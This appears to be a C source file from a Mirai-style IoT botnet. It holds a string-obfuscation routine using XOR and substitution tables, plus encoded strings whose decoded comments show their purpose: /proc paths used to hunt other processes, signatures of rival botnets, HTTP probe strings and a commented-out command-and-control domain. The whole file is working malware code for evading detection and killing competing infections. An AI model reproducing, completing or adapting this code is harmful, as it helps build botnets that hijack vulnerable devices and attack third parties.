#define _GNU_SOURCE

#include <stdlib.h>
#include <string.h>

#include "entry.h"
#include "main.h"

void xor(uint8_t *data, int data_len)
{
    int i = 0;
    uint8_t k1 = key & 0xff, k2 = (key >> 8) & 0xff, k3 = (key >> 16) & 0xff, k4 = (key >> 24) & 0xff;

    for(i = 0; i < data_len; i++)
    {
        data[i] ^= k1;
        data[i] ^= k2;
        data[i] ^= k3;
        data[i] ^= k4;
    }

    return;
}

void load_entry(char *val, uint16_t val_len, uint8_t id)
{
	int i = 0;
	int p = 0;
	int x = 0;

	entry_list[id].val_len = val_len;
	entry_list[id].id = id;
	entry_list[id].val = (char *)malloc(val_len + 1);

	while(TRUE)
	{
		if(!*val)
		{
			break;
		}

		for(i = 0; i < sizeof(enc_table); i++)
		{
			if(*val == enc_table[i])
				entry_list[id].val[x] = dec_table[i];
		}

		val++;
		x++;
	}

	entry_list[id].val[x] = 0;

    return;
}

void init_entry(void)
{
	xor(enc_table, sizeof(enc_table));
	xor(dec_table, sizeof(dec_table));

    //load_entry("wcbtbt=rthxmbwgrowdemrx=vz", 26, DOMAIN); // ohyaya.raiseyourdongers.pw
    load_entry("@vrwq@xmna@msm", 14, PROC_SELF_EXE); // /proc/self/exe
    load_entry("@vrwq@", 6, PROC); // /proc/
    load_entry("@utvx", 5, MAPS); // /maps
    load_entry("@msm", 4, EXE); // /exe
    load_entry("@qwuu", 5, COMM); // /comm
    load_entry("@qzo", 4, CWD); // /cwd
    load_entry("@ktr@iuv", 8, VAR_TMP); // /var/tmp
    load_entry("@ktr", 4, VAR); // /var
    load_entry("vhppt", 5, PIZZA_SIG); // pizza
    load_entry("owdex", 5, DONGS_SIG); // dongs
    load_entry("cmnvmrOaYmnvhde", 15, HELPER_SIG); // helperOfHelping
    load_entry("xntkm", 5, SLAVE_SIG); // slave
    load_entry("atrimo", 6, FARTED_SIG);  // farted
    load_entry("nwnaei", 6, LOLFGT_SIG); // lolfgt
    load_entry("zwnamsmqfhd", 11, WOLF_SIG); // wolfexecbin
    load_entry("imndmiwd", 8, TELNETON_SIG); // telneton
    load_entry("KZUDXF", 6, PLSDIE_SIG); // PLSDIE
    load_entry("KOUT^@qod$qeh@", 14, POST_MIRAI_SIG); // POST /cdn-cgi/
    load_entry("@vrwq@dmi@iqv", 13, PROC_NET_TCP); // /proc/net/tcp
    load_entry("WFT^@^YTTK@8=7", 14, GET_HTTP_REQUEST); // GET / HTTP/1.0
    load_entry("gq$ciivo^8=7=7", 14, UC_HTTPD_RESPONSE); // uc-httpd 1.0.0
    load_entry("Mrm^icm^qchqymd^tdo^icm^umnwd^itxib^mdwgec", 42, RUNTIME_MSG); // Are the chicken and the melon tasty enough
    load_entry("@ao", 3, FD); // /fd

	return;
}

char *retrieve_entry_val(uint8_t id)
{
	return entry_list[id].val;
}

uint16_t retrieve_entry_val_len(uint8_t id)
{
	return entry_list[id].val_len;
}
